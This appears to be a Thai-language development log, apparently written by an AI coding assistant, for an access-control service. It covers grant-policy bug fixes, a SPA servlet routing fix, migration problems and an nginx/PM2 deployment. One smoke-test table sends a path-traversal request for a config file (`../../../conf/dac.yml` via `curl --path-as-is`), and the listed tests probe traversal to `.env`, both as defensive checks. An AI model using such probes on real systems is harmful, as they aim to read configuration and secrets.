| `./mvnw -q -am -pl backend/dac-engine test` | **exit 0** · PolicyAlgebra 34 · PolicyEngine 32 · Evaluator 13 · SelectorMatcher 10 · SubjectMatcher 13 · SubscriptionPolicy 35 · TimeMatcher 12 · + ExpressionReference (dynamic) |
| `./mvnw -am -pl backend/dac-service verify -Pintegration` | `GrantCompositionIT$AgainstDataPolicies` **4/4 ผ่าน** (ขา grant × data policy) |
| `npx tsc --noEmit` | **exit 0** |
| `npx jest --silent` | **17 suites / 92 tests ผ่าน** |
| `vite build` (base `/Arak/`) | **exit 0** — 866.27 kB JS / 223.87 kB CSS |
| seeder | รันสองรอบ: created 11 → updated 11 (idempotent จริง) |

> ⚠️ **กับดักที่เสียเวลาไปรอบนี้ บันทึกไว้กันพลาดซ้ำ**
> 1. `-DfailIfNoTests=false` **ไม่ได้** ทำให้ failsafe ยอมผ่าน parent pom — ตัวที่ใช่คือ `-Dfailsafe.failIfNoSpecifiedTests=false` · ถ้าไม่ใส่ `./mvnw -am -pl … verify -Dit.test=X` จะ BUILD FAILURE ที่ `dac-parent` ใน 1 วินาที โดยทุก module SKIPPED
> 2. **รายงาน failsafe/surefire เก่าค้าง** — รันที่ล้มก่อนถึง test phase ทิ้งรายงานรอบก่อนไว้ ซึ่งดู "เขียว" ทั้งที่ไม่ได้รันอะไรเลย → `rm -rf target/failsafe-reports` ก่อนรันแบบเจาะจงเสมอ แล้วดู exit code จริง
> 3. คำสั่ง background ที่ลงท้ายด้วย `echo` จะรายงาน **exit 0 เสมอ** ใน notification → ต่อท้ายด้วย `; echo "exit=$?" >> log` แล้วอ่านจาก log

---

## รอบก่อนหน้า — เขียน IT ให้ FR-7 แล้วพบว่า **grant ไม่เคยถึง engine เลยสักใบ** กับอีกสองบั๊กที่ซ่อนอยู่ใต้มัน

> รอบที่แล้วปิด FR-7 ด้วยการพิสูจน์ด้วยมือ (ตาราง 6 แถวในข้อ AD.1) แล้วจดค้างไว้ว่า *"property ข้อที่สามพิสูจน์ด้วยมือแล้ว แต่ยังไม่มีใน CI"* · รอบนี้เขียน IT ให้มัน แล้ว **ล้ม 5 จาก 12 ตั้งแต่รันแรก — ไม่ใช่เพราะเทสต์ผิด** · ทั้งสามบั๊กข้างล่างนี้ไม่มีตัวไหนมองเห็นได้จากหน้าจอ

### AE.1 🔴 grant ไม่เคยถูก engine อ่านเลยสักใบ ตั้งแต่วันที่ merge

`PolicyEngine.bind()` คัด policy ด้วย `SelectorMatcher.matches(policy.getSelector(), asset)` และ `matches(null, …)` คืน `false` เสมอ — **ซึ่งถูกแล้ว** สำหรับ policy ที่คนเขียน: selector ที่ไม่ได้ระบุอะไร ต้องแปลว่า "ไม่ selects อะไรเลย" ไม่ใช่ "selects ทุกอย่าง" (fail-closed)

แต่ **grant คือ policy ตัวเดียวที่ไม่มี selector โดยธรรมชาติ** เพราะมันไม่เคยถูกเขียนจาก facet — มีคนชี้ table หนึ่งใบให้คนหนึ่งคน แล้ว `GrantStore.asPolicy` พา asset มาใน `scopeFqn` แทน → **grant ทุกใบถูกทิ้งก่อนถึงขั้น compose**

แก้ที่ `PolicyEngine` ไม่ใช่ที่ `SelectorMatcher` และไม่ใช่ด้วยการปั้น selector ปลอมให้ grant (`FacetCondition.FacetType` ไม่มี `fqn` ให้ใช้อยู่แล้ว):

```java
private static boolean selects(Policy policy, AssetContext asset) {
  if (policy.getSelector() != null) {
    return SelectorMatcher.matches(policy.getSelector(), asset);
  }
  return policy.getScopeFqn() != null && policy.getScopeFqn().equals(asset.fqn());
}
```

ข้อยกเว้นถูกบีบให้แคบที่สุดเท่าที่จะทำได้ — ต้องมี `scopeFqn` **ตรงกับ asset ที่กำลังถาม** ไม่งั้น "policy ที่ไม่มี selector" จะกลายเป็น "policy ที่ใช้กับทุก asset" ซึ่งคือความพังที่ `SelectorMatcher` ตั้งใจกันไว้ตั้งแต่ต้น

### AE.2 🔴 grant ให้คนหนึ่งคน = ปิด table นั้นจากคนที่เหลือทั้งองค์กร

พอ grant ถึง engine ได้แล้ว เทสต์ล้มต่ออีกตัว และตัวนี้หนักกว่าตัวแรก

`decideSubscription` compose แบบ intersection: **ทุกชั้นที่มีความเห็นต้องอนุญาต** และ "ชั้นที่มีความเห็น" ถูกนิยามว่า *ชั้นที่มี ALLOW อยู่* · grant คือ ALLOW ที่ชั้น TABLE → **grant หนึ่งใบสร้าง gate ที่ชั้น TABLE ขึ้นมา** แล้วคนอื่นทุกคนที่ผ่าน ORG policy มาได้ ก็ตกที่ชั้นนี้เพราะ grant ไม่ได้ระบุชื่อเขา

พูดเป็นภาษาคน: **owner คนหนึ่งให้ analyst_a เข้า table หนึ่งใบ = ยึด table ใบนั้นคืนจากทุกคนที่เหลือ** โดยไม่มี log ไม่มีคำเตือน และหน้าจอยังแสดงว่า policy เดิม active อยู่ครบ

แก้โดยแยก "ALLOW ที่ตั้ง gate ได้" ออกจาก "ALLOW ที่เพิ่มสิทธิ์อย่างเดียว":

| | policy ที่คนเขียน | grant (FR-7) |
|---|---|---|
| เขียนจาก | selector บน facet → พูดแทน asset ทั้งกลุ่ม | ชื่อคนหนึ่งคน + table หนึ่งใบ |
| ตั้ง gate ให้ชั้นตัวเองได้ไหม | **ได้** — เป็นความเห็นเรื่องว่า "ใครควรผ่านชั้นนี้" | **ไม่ได้** — ไม่ได้พูดถึงใครนอกจากคนที่ระบุ |
| ผ่าน gate ที่ชั้นเดียวกันที่คนอื่นตั้งไว้ได้ไหม | ได้ | **ได้** — นี่คือประโยชน์ทั้งหมดของ grant |
| ผ่าน gate ชั้นที่สูงกว่า (ORG) ได้ไหม | — | **ไม่ได้** เว้นแต่ policy ชั้นนั้นเปิด `allowLocalOverride` (FR-3.1.4) |

**ผลสองชั้นที่ซ้อนกันอยู่:** `AccessQuery` (แท็บ Access) ตอบคำถาม "ใครเข้า table นี้ได้บ้าง" ด้วยการ **รัน engine ให้ทุก principal จริงๆ** ไม่ใช่อ่านตาราง grant มาบวกตาราง policy — ซึ่งเป็นการออกแบบที่ถูก และแปลว่าหน้าจอนั้นสะท้อนบั๊กทั้งสองตัวตรงๆ: ก่อนแก้ข้อ AE.1 **ไม่มีใครเคยขึ้นเป็น origin `GRANT` ได้เลย** และหลังจากนั้นพอมี grant หนึ่งใบ รายชื่อทั้งหน้าก็จะยุบเหลือคนที่ถือ grant คนเดียว — โดยหน้าจอรายงานอย่างมั่นใจว่านั่นคือคำตอบที่ถูก

ตัวแยกใช้ field เดียวกับข้อ AE.1: `additive(policy) == (policy.getSelector() == null)` · เมื่อไม่มี gate เลยทั้ง asset (เคสปกติของ FR-7 — table ที่ไม่มีใครเขียน policy ถึง) grant ที่ match คือคำตอบทั้งหมด

### AE.3 🪤 `PolicyStore.create` เติม `environment = 'dev'` ให้เงียบๆ ขณะที่ทุก decision ตัดสินใน `prod`

เทสต์สองตัวล้มด้วยทิศกลับด้าน (คาดว่า deny แต่ได้ allow) และคราวนี้ **ไม่ใช่บั๊กของ engine แต่เป็นกับดักที่ fixture เดินเข้าไปเหยียบ**

```java
// PolicyStore.java:120
.bind("environment", document.getEnvironment() == null ? "dev" : value(document.getEnvironment()))
```
ขณะที่ `DecisionService.DEFAULT_ENVIRONMENT = "prod"` และ `activeFor` กรอง `AND p.environment = :environment`

→ policy ที่สร้างโดยไม่ระบุ environment **save ผ่าน · bind ติด · activate ได้ · อ่านกลับมาครบทุก field · และไม่เคยถูกเรียกใช้** — ความพังแบบเดียวกับที่ commit `63361eb` แก้ไปแล้วรอบหนึ่ง แต่เหลือทางเข้าไว้อีกทาง

**ยังไม่แก้ในโค้ด production รอบนี้** เพราะการสลับ default เป็น `prod` แปลว่า **policy เก่าทุกแถวที่ตอนนี้นอนอยู่เฉยๆ ใน `dev` จะเริ่มบังคับใช้ทันทีที่ deploy** — เป็นการเปลี่ยนพฤติกรรมของข้อมูลที่มีอยู่แล้ว ไม่ใช่แค่แก้บั๊ก · จดเป็นช่องว่างข้อ 9 แทน · ฝั่ง fixture ปักไว้ที่ `DecisionService.DEFAULT_ENVIRONMENT` ตรงๆ

### AE.4 ⚠️ แก้บันทึกของรอบที่แล้ว — "หลักฐานจากของจริง" ในข้อ AD.1 พิสูจน์สิ่งที่เขียนไว้ไม่ได้

ตาราง 6 แถวในข้อ AD.1 จบด้วยแถวที่ว่า *grant ถูกบันทึกแล้วแต่ `analyst_b` ยังเข้าไม่ได้* แล้วสรุปว่า **"นี่คือ FR-5.1 ทำงานจริง — policy DENY ชนะ grant"**

ผลลัพธ์นั้นถูก แต่ **คำอธิบายพิสูจน์ไม่ได้** — "grant ถูก policy DENY ทับ" กับ "grant ไม่เคยถูกโหลดเลย" (ข้อ AE.1) ให้ผลหน้าจอเหมือนกันทุกประการ · การเช็คด้วยมือแยกสองกรณีนี้ไม่ออกโดยหลักการ เพราะมันดูได้แค่คำตอบสุดท้าย · IT แยกออกเพราะมันถามคำถามที่ขั้วกลับกันด้วย (**analyst_b ต้องเข้าได้**) ซึ่งเป็น assertion ที่ล้มทันทีถ้า ALLOW ฝั่งตรงข้ามไม่ทำงาน

> บทเรียนที่ควรจดไว้: **เทสต์ที่ยืนยันเฉพาะฝั่ง deny ผ่านได้ด้วยเหตุผลที่ผิด** — ระบบที่พังจนปฏิเสธทุกอย่างก็ทำให้เทสต์ฝั่ง deny เขียวหมดเหมือนกัน · ทุกกลุ่มเทสต์เรื่องสิทธิ์ต้องมีแถว "แล้วใครที่ *ควร* เข้าได้ ยังเข้าได้อยู่ไหม" เสมอ

### AE.5 `audit_decision.evaluation_ms` มีค่าแล้ว (ปิดช่องว่างข้อ 5)

จับเวลาที่ **จุดที่ผู้เรียกรอจริง** ใน `QueryService` ไม่ใช่ข้างใน engine — เพราะ NFR-2 ถามถึงเวลาที่ผู้ใช้รอ ไม่ใช่เวลาที่ engine ใช้คิด · ปัดขึ้นเสมอ เพราะ column ที่เป็นศูนย์ทั้งแถวกับ column ที่เป็น NULL ทั้งแถว ตอบคำถาม p95 ได้พอๆ กันคือไม่ได้เลย

### AE.6 🔴 หน้า asset ทุกหน้าจะ **404 ตอน refresh บน prod** — เจอเพราะลองเปิดของจริงที่ URL จริง

ผู้ใช้สั่งว่าอยากเห็น **แบบที่ลง prod ได้ ไม่ใช่ docker และไม่ใช่ dev server** · พอเปิด jar เสิร์ฟ `dist` ที่ build ด้วย `VITE_BASE=/Arak/` แล้วยิงตาม URL จริง เจอว่า:

```
GET /Arak/                                        → 200
GET /Arak/assets/index-C0TORp7Z.js                → 200
GET /Arak/catalog/prod-pg.SalesDB.dbo.customer    → 404   ← ทุกหน้า asset
```

**สาเหตุ** — `SpaServlet.looksLikeFile()` ตัดสินว่า path ไหนเป็นไฟล์ด้วยกฎ *"segment สุดท้ายมีจุด"* ซึ่งถูกกับ `index-a91f3c.js` แต่ผิดกับทุก route ของแอปนี้ที่ลงท้ายด้วย **FQN** (`/catalog/<service>.<db>.<schema>.<table>`) · pathที่ถูกอ่านว่าเป็นไฟล์ที่หายไป → 404 แทนที่จะคืน `index.html` ให้ router ในเบราว์เซอร์จัดการ

**ผลจริง** — คลิกจากหน้า Catalog เข้าไปได้ปกติ (router เดินในเบราว์เซอร์ ไม่ได้ยิง request) แต่ **กด F5 / เปิด bookmark / แชร์ลิงก์ให้คนอื่น = 404** บนหน้าที่ data owner เปิดบ่อยที่สุด

**แก้** — เปลี่ยนกฎจาก "มีจุด" เป็น **"นามสกุลอยู่ใน `TYPES` ที่ servlet เสิร์ฟได้จริง"** ซึ่งเป็น list ปิดอยู่แล้วในไฟล์เดียวกัน (ใช้ dot ตัวท้าย ไม่ใช่ตัวแรก — `app.min.js` นามสกุลคือ `js`) · `.customer` ไม่ใช่ file type → เป็น route · `.js` ที่หายไปยัง 404 เสียงดังเหมือนเดิม

**บทเรียนสองข้อ**
1. บั๊กนี้ **มองไม่เห็นจาก dev server** — Vite มี SPA fallback ของตัวเองที่คืน `index.html` ให้ทุก path ที่ไม่ใช่ไฟล์ · จะเจอได้ก็ต่อเมื่อเปิด **artifact ตัวที่จะเอาไปลงจริง** เท่านั้น
2. `SpaServlet` **ไม่เคยมีเทสต์เลย** ทั้งที่มันเป็นตัวตัดสินว่า request ไหนเป็นหน้าเว็บ request ไหนเป็นไฟล์ · เพิ่ม `SpaServletTest` 7 เทสต์ (route / ไฟล์ / FQN / asset ที่หายไป / path traversal ออกไปหา `.env` / index ต้องไม่ถูก cache)

### AE.7 วิธีดูของจริงบนเครื่อง dev โดยไม่แตะโค้ด prod

nginx บนเครื่องปลายทางตัด prefix ทิ้งด้วย **slash ท้าย `proxy_pass`** (`proxy_pass http://127.0.0.1:8090/;`) → ตัว service ไม่เคยรู้เลยว่าตัวเองถูก mount ที่ `/Arak/` · แต่ **bundle รู้** เพราะมันสร้าง URL ในเบราว์เซอร์ (`src/basePath.ts` อ่านจาก `<meta name="arak-base">`)

แปลว่า **เปิด jar เดี่ยวๆ ที่ `/Arak/` ไม่ได้** — ไม่มีใครตัด prefix ให้ · วิธีที่ใช้รอบนี้คือเขียน reverse proxy ~40 บรรทัดใน scratchpad ที่ทำสิ่งเดียวกับ `deploy/nginx-arak.conf` (301 จาก `/Arak`, ตัด prefix, ส่งต่อ 8080) แล้วเปิดที่ `http://localhost:8090/Arak/` → **artifact ที่ทดสอบคือไฟล์ตัวเดียวกับที่จะ copy ขึ้น host เป๊ะๆ ไม่ได้ build พิเศษ**

> ทางเลือกที่ **ไม่เลือก**: ทำให้ `SpaServlet` ตัด prefix เองเวลาเจอ · มันจะทำให้ jar เปิดเดี่ยวๆ ได้และกัน `proxy_pass` ที่ลืม slash ท้ายด้วย — แต่เป็นการเพิ่มโค้ดใน prod เพื่อแก้ปัญหาของการดูบนเครื่อง dev และ Jersey ถูก map ที่ `/api/*` ไปแล้ว การ rewrite ต้องไปอยู่ชั้น Jetty handler ก่อน servlet mapping ไม่ใช่ filter ธรรมดา · จดไว้เป็นช่องว่างข้อ 10

---

## รอบก่อนหน้า — FR-7 grant ครบวง · หน้า Asset เป็น 5 แท็บ · และ **ย้าย deploy ไปเป็นแบบเดียวกับแอปอื่นบนเครื่องปลายทาง**

> รอบนี้มีสามเรื่องที่ไม่เกี่ยวกัน และ **บั๊ก schema หนึ่งตัวที่ซ่อนมาตั้งแต่ V3** ซึ่งโผล่ออกมาเพราะเรื่องแรก

### AD.1 FR-7 — grant ตรงระดับ table ครบวง (ผู้ใช้สั่ง)

โจทย์จากผู้ใช้: *"อยากให้สามารถ Grant แบบ Assign ตรง ได้ด้วย คือ Grant ระดับ Table … เข้าตั้งแต่ Start date end date หรือนับถอยหลัง · มีหน้าจอให้ดู ระดับ Table ที่บอกว่า Table นี้ให้ User หรือ group ไหน เข้าได้ จาก การ assign ตรง หรือมาจาก Global policy"*

**เส้นแบ่ง:** policy บอกว่า *ใครเข้าถึง asset กลุ่มไหนได้* · grant บอกว่า *คนนี้ เข้า table นี้ ได้ถึงวันนี้* ทั้งคู่จบที่ `PolicyDecision` ตัวเดียวกัน และ **grant compose แบบ intersection เหมือนทุกอย่าง (FR-5.1)** — เปิดให้ได้ตรงที่ไม่มี policy พูดถึง แต่ **แหก DENY ของ policy ไม่ได้** ถ้า grant ผ่อน global policy ได้เมื่อไหร่ global policy ทุกตัวก็กลายเป็นแค่ข้อเสนอแนะ

| ไฟล์ | บรรทัด | หน้าที่ |
|---|---|---|
| `access/GrantStore.java` | 598 | อ่าน/เขียน grant + เขียน `audit_grant_change` ทุกครั้ง · `asPolicy` แปลง grant เป็น input ของ engine |
| `access/AccessQuery.java` | 291 | "ใครเข้า table นี้ได้บ้าง" — รวมคนที่มาจาก policy กับคนที่มาจาก grant ไว้ในคำตอบเดียว พร้อมบอก origin |
| `access/GrantExpiryJob.java` | 80 | FR-7.2 — ปิด grant ที่หมดอายุ เขียน tombstone ด้วย actor `system` |
| `resources/AccessResource.java` | 177 | `/v1/access/{assets,history,mine,principals}/…` + `POST /grants` + `POST /grants/{id}/revoke` |
| `db/migration/V11__access_grant.sql` | 105 | **ALTER ไม่ใช่ CREATE** — ดูข้อ AD.4 |
| `frontend/app/src/api/access.ts` | 190 | client |
| `pages/catalog/AccessTab.tsx` | 506 | หน้าจอหลัก — คนที่เข้าได้ แยกว่ามาจาก grant หรือจาก policy |
| `pages/catalog/GrantDialog.tsx` | 325 | ฟอร์ม grant — ใคร / นานเท่าไหร่ / ทำไม · นับถอยหลังเป็นปุ่ม (7/30/90/365/ไม่มีวันหมด) default 30 วัน |
| `pages/catalog/AuditTab.tsx` | 135 | trail ของ GRANT / REVOKE / EXPIRE |

**ที่ตั้งใจให้เป็นแบบนี้:**
- **grant ผูกกับ `asset_fqn` ไม่ใช่ `asset.id`** — `asset` เป็น SCD2 ถ้าผูกกับ id แล้ววันหนึ่งมีคนเพิ่ม column สิทธิ์ของทุกคนจะหายเงียบๆ
- **principal มาจากทุกแหล่ง** (local / OpenMetadata team / Entra ในอนาคต) เพราะทั้งหมดเป็นแถวใน `principal` อยู่แล้ว — ตรงกับที่ผู้ใช้สั่งว่า *"เอาทุก group ที่มีอะ local group, openmetadata, entra ในอนาคต"*
- **revoke เป็น tombstone ไม่ใช่ delete** — "เมื่อมีนาคมใครมีสิทธิ์" ต้องตอบได้
- **`reason` บังคับ** — ปีหน้ามันคือ column เดียวที่ยังอธิบายแถวนี้ได้
- **ไม่มี unique constraint บน (asset, principal)** เพราะคนหนึ่งถือ grant สองใบพร้อมกันได้จริง (ใบยืนพื้น + ใบต่ออายุสั้นๆ) · ที่ต้องกันคือ **double-click** → unique index บน `(asset_fqn, principal_id, valid_from)` เฉพาะแถวที่ยังไม่ revoke

**พิสูจน์กับของจริงแล้ว** (2026-09-23 · backend + `dac-appdb` + policy fixture เดิม):

| ขั้น | ผล |
|---|---|
| `GET /v1/access/assets/demo-pg.salesdb.sales.customer` | `analyst_a` (3 policies · mask 2 column · row filter 1) และ `steward_c` (2 policies) — origin `POLICY` ทั้งคู่ |
| `POST /v1/access/grants` ให้ `analyst_b` | **201** · คืน row เต็มพร้อม `grantedBy: admin` |
| `GET /v1/access/assets/…` อีกรอบ | `grants: 1` แต่ **`analyst_b` ยังไม่โผล่ในรายชื่อคนที่เข้าได้** |
| `GET /v1/access/history/…` | `GRANT analyst_b by admin` |
| `POST /v1/access/grants/{id}/revoke` | **200** |
| history อีกรอบ | `REVOKE` + `GRANT` ครบสองแถว · `grants: 0` |

> แถวที่สำคัญที่สุดคือแถวที่สาม — **grant ถูกบันทึกแล้ว แต่ `analyst_b` ยังเข้าไม่ได้** เพราะ policy DENY เขาอยู่ (country SG ≠ dataResidency TH)
>
> ⚠️ **คำอธิบายบรรทัดบนนี้ผิด — ดูข้อ AE.4** · ตอนที่บันทึกนี้ถูกเขียน grant ยังไม่เคยถึง engine เลยสักใบ (ข้อ AE.1) ผลที่เห็นจึงอธิบายได้ทั้งสองทางและการเช็คด้วยมือแยกไม่ออก · ตอนนี้ property นี้มี IT คุมแล้วจริง

### AD.2 หน้า Asset แตกเป็น 5 แท็บ

ผู้ใช้เคยบอกว่า *"หน้าที่เข้าไปดู Asset ยังไม่สวยเลย"* และขอ *"Tab เต็มรูปแบบ: Overview / Access / Policies / Columns / Audit"*

`AssetDetailPage.tsx` 456 → 538 บรรทัด · **หัวหน้าเพจไม่ขยับแม้แต่ byte เดียว** และ panel ทุกอันเป็นของเดิม ย้ายที่อยู่เฉยๆ ตามที่ผู้ใช้กำชับว่า *"เอาให้ทุกอย่าเหมือนเดิมนะ ความสวยงาม หรือทุกอย่าง"*

- **แท็บที่เปิดอยู่อยู่ใน query string** (`?tab=access`) — "ไปดู access ของ table นี้หน่อย" เป็นข้อความที่คนส่งกันจริง ลิงก์ควรพาไปถึงคำตอบ ไม่ใช่พาไปหัวเพจ
- `setSearch(…, { replace: true })` — อ่าน 5 แท็บไม่ควรทิ้ง 5 ขั้นไว้ในปุ่ม back ระหว่างหน้านี้กับ catalog
- `Panel` / `Field` ย้ายไปอยู่ `panels.tsx` เพราะ 3 แท็บใช้ร่วมกันแล้ว ถ้าแต่ละแท็บวาดการ์ดของตัวเองมันจะเลิกดูเหมือนหน้าเดียวกัน
- badge นับจำนวนมีแค่แท็บ Columns — เป็นตัวเดียวที่มีตัวเลขอยู่ในมือแล้ว ตัวอื่นต้องยิง request เพิ่มเพื่อเอาเลขไปแปะบนแท็บที่ยังไม่มีใครเปิด และเลขที่บางทีเป็นตัวเลขบางทีเป็น spinner อ่านแล้วเหมือนระบบพัง

### AD.3 ย้าย deploy ไปเป็นแบบเดียวกับแอปอื่นบนเครื่องปลายทาง — **ไม่ใช่ Docker**

ผู้ใช้ให้เข้าไปดูเครื่อง deploy จริงแล้วถามว่า *"เราเปลี่ยนให้เป็นแบบเขาได้ไหม"* — คำตอบเดิมที่เคยให้ไว้ (docker image) **ใช้กับเครื่องนั้นไม่ได้** เพราะไม่มี Docker ไม่มี Java ของระบบ และไม่มี sudo แบบไม่ต้องถาม

แบบของเขา: **PM2 หนึ่ง process ต่อแอป · แต่ละแอปพอร์ตของตัวเอง · nginx ตัวเดียวข้างหน้าแยกด้วย path prefix** → ARAK ได้ `/Arak/` → `127.0.0.1:8090` (admin 8091)

| ไฟล์ | ทำอะไร |
|---|---|
| `config/WebConfiguration.java` | `web.root` / `web.basePath` / `web.assetCacheSeconds` — **ชี้ไปที่ไดเรกทอรีบนดิสก์ ไม่ใช่ฝังไฟล์ไว้ใน jar** จะได้แก้ CSS แล้ว copy ทับได้โดยไม่ต้องมี Maven บนเครื่องที่ไม่มี Maven |
| `web/SpaServlet.java` (164) | กติกาสองข้อ — **ขอไฟล์ที่มีอยู่ = ได้ไฟล์นั้น** (asset ที่มี hash cache 1 ปี · `index.html` `no-store`) · **ขอ path ที่ไม่มี = ได้ตัวแอป** (SPA fallback) ยกเว้น path ที่หน้าตาเป็นชื่อไฟล์ → 404 ไม่ใช่ยัด HTML ให้ browser ไป parse เป็น script |
| `DacApplication.serveWebApp` + `checkMountPoint` | ติดตั้ง servlet + **เทียบ mount point ที่ bundle ประกาศไว้กับ `web.basePath` ตอน start** |
| `basePath.ts` + meta `arak-base` ใน `index.html` | Vite เขียน `%BASE_URL%` ลง meta tag ตอน build · runtime อ่านจาก meta → router `basename` + axios `baseURL` · **ไม่ใช้ `import.meta.env.BASE_URL`** เพราะ ts-jest รันเป็น CommonJS แล้ว `import.meta` พังทุกเทสต์ที่ import ไฟล์นั้น |
| `deploy/start.sh` | สิ่งที่ PM2 รัน · ไม่มี `.env` ไม่ยอม start · `-XX:MaxRAMPercentage=40` ไม่ใช่ `-Xmx` เพราะเครื่องใช้ร่วมกันหลายแอป · `exec` เพื่อให้ PM2 คุม JVM ตรงๆ |
| `deploy/nginx-arak.conf` | อยู่ในโฟลเดอร์ของแอปเอง เพื่อให้แตะ `/etc/nginx` ครั้งเดียวด้วย `include` บรรทัดเดียว (**ต้องเป็น full path — nginx ไม่ขยาย `~`**) |
| `deploy/DEPLOY.md` | ขั้นตอนทั้งหมด + สองขั้นที่ต้องใช้สิทธิ์ admin (`CREATE ROLE`/`CREATE DATABASE` · include + `nginx -t && systemctl reload`) |

**ทำไมต้องมี `checkMountPoint`:** bundle ที่ build มาเพื่อ `/` แล้วเอาไป mount ที่ `/Arak/` คือ **หน้าขาวเปล่า** ที่เบาะแสเดียวคือ 404 ของไฟล์ที่มีอยู่จริง · ตอนนี้ service log ERROR พร้อมบอกคำสั่ง rebuild ที่ถูกต้อง — และมันทำงานจริง เห็นกับตารอบนี้ (ดูข้อ AD.5)

**ยิงจริงแล้วทั้งหมด** (backend รันพร้อม `APP_WEB_ROOT` + `APP_WEB_BASE_PATH=/Arak/`):

| request | ผล |
|---|---|
| `GET /` | 200 · `text/html` · `no-store, must-revalidate` |
| `GET /assets/index-Dpp5UynE.js` | 200 · `text/javascript` · `public, max-age=31536000, immutable` |
| `GET /catalog` | 200 · html (SPA fallback) |
| `GET /assets/missing.js` | **404** ไม่ใช่ index.html |
| `GET /assets/../../../conf/dac.yml` (`curl --path-as-is`) | **400** — Jetty ตีตกก่อนถึง servlet ด้วยซ้ำ |
| `POST /api/v1/auth/login` (รหัสผิด) | **401 json** — Jersey ยังได้ route ของตัวเอง |
| `GET /api/v1/catalog/assets` (ไม่มี token) | **401 json** |

> nginx ตัด prefix ออกด้วย trailing slash ใน `proxy_pass` → **service ไม่เคยเห็น `/Arak` เลย เห็นแต่ browser** · path ที่ทดสอบข้างบนจึงเป็น path ที่ service จะได้รับจริงหลัง nginx

**ยังไม่ได้ทำ:** ยังไม่ได้ขึ้นเครื่องจริง — บนเครื่องนั้นแตะแค่ `mkdir -p ~/Arak/deploy` ตามที่ผู้ใช้สั่งว่า *"ห้ามแตะของคนอื่น"* · ตอนอ่าน `.env` ของทีมอื่นพิมพ์แต่ชื่อ key ไม่เคยพิมพ์ค่า

### AD.4 🐛 `access_grant` ถูกประกาศไว้สองที่ — V3 กับ V11 ชนกัน

อาการ: backend start ไม่ขึ้นเลย
```
Migration of schema "public" to version "11 - access grant" failed! Changes successfully rolled back.
Message : ERROR: relation "access_grant" already exists
```
แต่ `flyway_schema_history` **ไม่มีแถว v11 เลยสักแถว** ไม่ว่าจะสำเร็จหรือล้มเหลว · และ `access_grant` มีอยู่จริงโดยมี 0 แถว

**เกือบ drop ตารางทิ้งเพราะเข้าใจผิดว่าเป็นของค้างจาก rollback** — ที่ช่วยไว้คือดู `\d access_grant` ก่อน แล้วเห็นว่า column ไม่ตรงกับที่ V11 เขียน (`target_fqn` + `policy_id` แทนที่จะเป็น `asset_fqn`) → `grep -l access_grant *.sql` → **`V3__policy.sql:77` สร้างมันไปแล้วตั้งแต่ migration ที่ 3**

V3 ร่างตารางนี้ไว้ตอนวางโครง policy ล่วงหน้าหลายเดือน ก่อนที่ FR-7 จะมีรูปร่าง · ไม่มีโค้ดไหนเคยอ่านหรือเขียนมันเลย (มีแต่ `TRUNCATE` ใน IT สามไฟล์) และ `GrantStore` ทั้งไฟล์เขียนตามรูปของ V11

**ทางที่เลือก — V11 กลายเป็น ALTER ไม่ใช่ CREATE:** rename `target_fqn` → `asset_fqn` · rename `created_at` → `granted_at` · drop `policy_id` · `reason` เป็น NOT NULL · เพิ่ม `revoke_reason` + constraint 2 ตัว · rename index เดิม + สร้างที่ขาด · แล้วค่อย `CREATE TABLE audit_grant_change`

> **ทำไมไม่ `DROP TABLE` แล้วสร้างใหม่ ทั้งที่ diff สั้นกว่ามาก:** migration ที่ drop ตารางคือ migration ที่ **ทำลายข้อมูลบนทุก database ที่การเดาของ V3 ดันถูกใช้งานจริง** — และ "มั่นใจว่าไม่มี database ไหนเป็นแบบนั้น" เป็นสิ่งที่ migration ตรวจเองไม่ได้ · ยอมเขียนยาวกว่าแล้วถูกทุกที่ดีกว่า

**บทเรียนที่ควรจำ:** ก่อนเขียน migration ใหม่ `grep -l '<ชื่อตาราง>' src/main/resources/db/migration/*.sql` ก่อนเสมอ

**และอีกกับดักที่ตามมาทันที:** แก้ไฟล์ `.sql` แล้ว restart — ยังพังข้อความเดิมเป๊ะ เพราะ **Flyway อ่าน migration จาก classpath คือจากใน jar ไม่ใช่จาก source tree** · ระหว่าง smoke test แก้ชั่วคราวด้วย `jar uf` ยัด resource ตัวใหม่เข้าไป แล้ว build ใหม่ทั้งก้อนทีหลัง

### AD.5 🪤 Git Bash แปลง path ให้เอง — โดนสามครั้งในรอบเดียว

MSYS แปลงค่าที่ **หน้าตาเหมือน absolute path ของ Unix** ก่อนส่งให้โปรแกรม native (`java.exe`, `node.exe`) โดยไม่บอกใคร

| ครั้ง | เขียนไป | โปรแกรมได้รับจริง | อาการ |
|---|---|---|---|
| build | `VITE_BASE=/Arak/ npx vite build` | `/Program Files/Git/Arak/` | build ผ่านสวยงาม · เสิร์ฟแล้ว **หน้าขาว** |
| run | `APP_WEB_BASE_PATH=/Arak/ java -jar …` | `C:/Program Files/Git/Arak/` | `checkMountPoint` ร้อง ERROR ถูกเป๊ะ |
| run (หลังแก้) | `MSYS_NO_PATHCONV=1` + `APP_WEB_ROOT="$PWD/…"` | `C:\c\Users\…` | พอปิดการแปลง `$PWD` ที่เป็น `/c/Users/…` ก็ไม่ถูกแปลงกลับด้วย |

**ทางแก้:** build จาก **PowerShell** (`$env:VITE_BASE='/Arak/'`) · ตอนรันตั้ง `MSYS_NO_PATHCONV=1` **แล้วใช้ `$(pwd -W)` สำหรับ path ที่เป็นไฟล์จริง**

> เป็นปัญหาของเครื่อง dev บน Windows เท่านั้น — บนเครื่อง deploy ที่เป็น Linux ไม่มีอาการนี้ · ที่น่าสนใจกว่าคือ **`checkMountPoint` จับได้ตั้งแต่ตอน start** ซึ่งเป็นเหตุผลที่เขียนมันขึ้นมาพอดี

### AD.6 เทสต์ frontend ที่ต้องแก้เพราะแท็บ (85 → 87)

4 เทสต์ใน `AssetDetailPage.test.tsx` ล้ม เพราะ assert ของที่ย้ายไปอยู่หลังแท็บแล้ว · `renderPage` รับ `tab` เพิ่มแล้วส่งผ่าน **query string ไม่ใช่การคลิก** — เพราะนั่นคือวิธีที่หน้านี้ถูกเปิดจริง ถ้าให้ทุกเทสต์คลิกเข้าไป ทุกเทสต์จะกลายเป็นเทสต์ของแถบแท็บไปด้วย

เพิ่มใหม่ 2 ตัวสำหรับแถบแท็บเอง — เปิดตามที่ลิงก์สั่ง · กดแล้วเปลี่ยนคำตอบจริง

> ตัวหลังเขียนผิดรอบแรก: assert `queryByText('Governance')` ว่าต้องหายไป แต่ **ตารางในแท็บ Columns มี header ชื่อ `Governance` ของตัวเอง** ข้อความจึงเจอทั้งสองแท็บและพิสูจน์อะไรไม่ได้เลย · แก้เป็น `queryByRole('heading', …)`

---

